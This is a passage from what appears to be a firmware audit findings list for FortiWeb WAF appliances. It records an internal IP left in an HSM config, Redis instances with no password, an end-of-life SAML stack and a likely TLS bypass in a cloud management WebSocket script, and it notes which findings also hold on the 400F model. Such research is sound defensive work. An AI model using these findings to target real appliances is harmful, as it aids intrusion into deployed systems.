        "FWB-F19: LOW -- Chrystoki.conf: SafeNet Luna HSM config references AWS VPC internal IP 172.31.160.2 in cert paths; dev artifact in production firmware",
        "FWB-F20: INFO -- MBR disk image format (not EFI/QCOW2); 4-partition layout; ext3 P2 directly mountable",
    ],

    "confirmed_in_400f_vs_kvm": [
        "FWB-F08: mcp_security_db.json v1.00010 (2025-09-15) present -- FortiWeb MCP WAF active in 400F",
        "FWB-F06: Redis configs in etc/redis/ (10 instances, no requirepass) -- same as KVM",
        "FWB-F07: Shibboleth SP 2.x (etc/saml/shibboleth/) -- same EOL SAML stack",
        "FWB-F05: wassd_ws.py present (etc/wassd_ws.py) -- cloud mgmt WebSocket TLS bypass likely same",
    ],
}
